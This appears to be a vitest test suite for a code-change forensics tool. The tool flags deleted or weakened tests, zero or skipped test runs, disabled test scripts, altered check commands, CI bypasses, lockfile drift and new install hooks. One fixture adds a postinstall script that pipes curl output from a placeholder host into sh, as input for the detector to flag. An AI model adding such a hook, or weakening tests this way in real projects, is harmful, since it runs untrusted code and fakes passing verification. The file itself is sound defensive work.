import { describe, expect, it } from 'vitest';
import { parseConfigText } from '../../src/config/load';
import type { ForensicsInput } from '../../src/forensics/rules';
import { runForensics } from '../../src/forensics/rules';
import type { FileChange } from '../../src/types';
import { makeCheck, makeInventory, makeRun } from '../helpers';

const BASE_CONFIG = parseConfigText(`version: 1
checks:
  - id: unit
    run: node --test
`);

const PROTECTED_CONFIG = parseConfigText(`version: 1
checks:
  - id: unit
    run: node --test
protected:
  - "docs/**"
`);

function change(
  overrides: Partial<FileChange> & Pick<FileChange, 'path'>,
): FileChange {
  return {
    status: 'M',
    isBinary: false,
    additions: 1,
    deletions: 1,
    addedLines: [],
    removedLines: [],
    baseSha256: '',
    headSha256: '',
    ...overrides,
  };
}

function forensicInput(overrides: Partial<ForensicsInput> = {}): ForensicsInput {
  return {
    changes: [],
    baseInventory: makeInventory(),
    headInventory: makeInventory(),
    configInfo: { source: 'base', trusted: true, sha256: '0'.repeat(64), modified: false },
    baseConfig: BASE_CONFIG,
    headConfig: null,
    headConfigState: 'same',
    headChecks: [],
    baseChecks: [],
    reproductions: [],
    baseManifest: {},
    headManifest: {},
    ...overrides,
  };
}

describe('forensics: test inventory', () => {
  it('flags a deleted test file with no replacement', () => {
    const findings = runForensics(
      forensicInput({
        changes: [change({ path: 'tests/price.test.js', status: 'D' })],
        baseInventory: makeInventory({ 'tests/price.test.js': { tests: 1, assertions: 1 } }),
        headInventory: makeInventory(),
      }),
    );
    expect(findings.some((finding) => finding.rule === 'test_file_deleted')).toBe(true);
    expect(findings.find((finding) => finding.rule === 'test_file_deleted')?.severity).toBe('hard');
  });

  it('treats delete plus add as a reorganization instead of deletion', () => {
    const findings = runForensics(
      forensicInput({
        changes: [
          change({ path: 'tests/price.test.js', status: 'D' }),
          change({ path: 'tests/pricing.test.js', status: 'A' }),
        ],
        baseInventory: makeInventory({ 'tests/price.test.js': { tests: 1, assertions: 1 } }),
        headInventory: makeInventory({ 'tests/pricing.test.js': { tests: 1, assertions: 1 } }),
      }),
    );
    expect(findings.some((finding) => finding.rule === 'test_file_deleted')).toBe(false);
    expect(findings.some((finding) => finding.rule === 'test_files_reorganized')).toBe(true);
  });

  it('flags removed assertions without new tests as a soft signal', () => {
    const findings = runForensics(
      forensicInput({
        changes: [
          change({
            path: 'tests/price.test.js',
            removedLines: [{ line: 7, text: '  assert.equal(applyDiscount(0), 0);' }],
          }),
        ],
        baseInventory: makeInventory({ 'tests/price.test.js': { tests: 1, assertions: 2 } }),
        headInventory: makeInventory({ 'tests/price.test.js': { tests: 1, assertions: 1 } }),
      }),
    );
    const finding = findings.find((entry) => entry.rule === 'assertions_reduced');
    expect(finding?.severity).toBe('soft');
  });

  it('flags expectations changed while a failing baseline turned green', () => {
    const check = makeCheck({
      head: makeRun('passed', { detected: true, total: 1, passed: 1 }),
      base: makeRun('failed', { detected: true, total: 1, failed: 1 }),
      attribution: 'regression',
    });
    const findings = runForensics(
      forensicInput({
        changes: [
          change({
            path: 'tests/price.test.js',
            removedLines: [{ line: 6, text: '  assert.equal(applyDiscount(100), 90);' }],
            addedLines: [{ line: 6, text: '  assert.equal(applyDiscount(100), 100);' }],
          }),
        ],
        baseInventory: makeInventory({ 'tests/price.test.js': { tests: 1, assertions: 1 } }),
        headInventory: makeInventory({ 'tests/price.test.js': { tests: 1, assertions: 1 } }),
        headChecks: [check],
        baseChecks: [check],
      }),
    );
    const finding = findings.find((entry) => entry.rule === 'tests_weakened_to_pass');
    expect(finding?.severity).toBe('hard');
    expect(finding?.evidence).toContain('applyDiscount(100), 90');
    expect(finding?.evidence).toContain('applyDiscount(100), 100');
  });
});

describe('forensics: execution evidence', () => {
  it('flags a green check that executed zero tests', () => {
    const findings = runForensics(
      forensicInput({
        baseInventory: makeInventory({ 'tests/price.test.js': { tests: 1, assertions: 1 } }),
        headChecks: [
          makeCheck({ head: makeRun('passed', { detected: true, total: 0, zeroTests: true }) }),
        ],
      }),
    );
    expect(findings.some((finding) => finding.rule === 'zero_tests_executed')).toBe(true);
  });

  it('flags a suite where every test was skipped', () => {
    const findings = runForensics(
      forensicInput({
        baseInventory: makeInventory({ 'tests/price.test.js': { tests: 1, assertions: 1 } }),
        headChecks: [
          makeCheck({
            head: makeRun('passed', {
              detected: true,
              total: 1,
              skipped: 1,
              allSkipped: true,
            }),
          }),
        ],
      }),
    );
    expect(findings.some((finding) => finding.rule === 'all_tests_skipped')).toBe(true);
  });

  it('does not flag zero tests when the baseline had no tests', () => {
    const findings = runForensics(
      forensicInput({
        headChecks: [
          makeCheck({ head: makeRun('passed', { detected: true, total: 0, zeroTests: true }) }),
        ],
      }),
    );
    expect(findings.some((finding) => finding.rule === 'zero_tests_executed')).toBe(false);
  });

  it('flags a disabled package test script', () => {
    const findings = runForensics(
      forensicInput({
        baseManifest: { scripts: { test: 'node --test' } },
        headManifest: { scripts: { test: 'true' } },
      }),
    );
    const finding = findings.find((entry) => entry.rule === 'test_script_disabled');
    expect(finding?.severity).toBe('hard');
  });

  it('flags fewer executed tests than the baseline', () => {
    const check = makeCheck({
      head: makeRun('passed', { detected: true, total: 1, passed: 1 }),
      base: makeRun('passed', { detected: true, total: 3, passed: 3 }),
    });
    const findings = runForensics(
      forensicInput({
        changes: [
          change({ path: 'tests/price.test.js', removedLines: [{ line: 1, text: 'test(...)' }] }),
        ],
        baseInventory: makeInventory({ 'tests/price.test.js': { tests: 3, assertions: 3 } }),
        headInventory: makeInventory({ 'tests/price.test.js': { tests: 1, assertions: 1 } }),
        headChecks: [check],
        baseChecks: [check],
      }),
    );
    expect(findings.some((finding) => finding.rule === 'executed_test_count_dropped')).toBe(true);
  });
});

describe('forensics: config, CI, and dependencies', () => {
  it('flags a modified verification command', () => {
    const headConfig = parseConfigText(`version: 1
checks:
  - id: unit
    run: node --test tests/nonexistent.test.js
`);
    const findings = runForensics(
      forensicInput({
        configInfo: { source: 'base', trusted: true, sha256: '1'.repeat(64), modified: true },
        headConfig,
        headConfigState: 'modified',
      }),
    );
    const finding = findings.find((entry) => entry.rule === 'check_command_modified');
    expect(finding?.severity).toBe('hard');
    expect(findings.some((entry) => entry.rule === 'config_modified')).toBe(false);
  });

  it('flags a removed check', () => {
    const headConfig = parseConfigText(`version: 1
checks:
  - id: other
    run: node --test
`);
    const findings = runForensics(
      forensicInput({
        configInfo: { source: 'base', trusted: true, sha256: '1'.repeat(64), modified: true },
        headConfig,
        headConfigState: 'modified',
      }),
    );
    expect(findings.some((entry) => entry.rule === 'check_removed')).toBe(true);
  });

  it('flags a CI test bypass', () => {
    const findings = runForensics(
      forensicInput({
        changes: [
          change({
            path: '.github/workflows/ci.yml',
            addedLines: [{ line: 9, text: '        continue-on-error: true' }],
          }),
        ],
      }),
    );
    const finding = findings.find((entry) => entry.rule === 'ci_test_bypass');
    expect(finding?.severity).toBe('soft');
  });

  it('flags lockfile drift without manifest changes', () => {
    const findings = runForensics(
      forensicInput({
        changes: [change({ path: 'package-lock.json' })],
        baseManifest: { scripts: { test: 'node --test' } },
        headManifest: { scripts: { test: 'node --test' } },
      }),
    );
    expect(findings.some((entry) => entry.rule === 'lockfile_drift')).toBe(true);
  });

  it('does not flag lockfile changes paired with dependency changes', () => {
    const findings = runForensics(
      forensicInput({
        changes: [change({ path: 'package-lock.json' })],
        baseManifest: { dependencies: {} },
        headManifest: { dependencies: { zod: '^3.25.0' } },
      }),
    );
    expect(findings.some((entry) => entry.rule === 'lockfile_drift')).toBe(false);
  });

  it('flags a new install lifecycle script', () => {
    const findings = runForensics(
      forensicInput({
        baseManifest: { scripts: { test: 'node --test' } },
        headManifest: {
          scripts: { test: 'node --test', postinstall: 'curl https://example.invalid | sh' },
        },
      }),
    );
    const finding = findings.find((entry) => entry.rule === 'install_script_added');
    expect(finding?.severity).toBe('soft');
  });

  it('flags a protected file outside the built-in categories', () => {
    const findings = runForensics(
      forensicInput({
        changes: [change({ path: 'docs/guide.md' })],
        baseConfig: PROTECTED_CONFIG,
      }),
    );
    expect(findings.some((entry) => entry.rule === 'protected_file_modified')).toBe(true);
  });
});
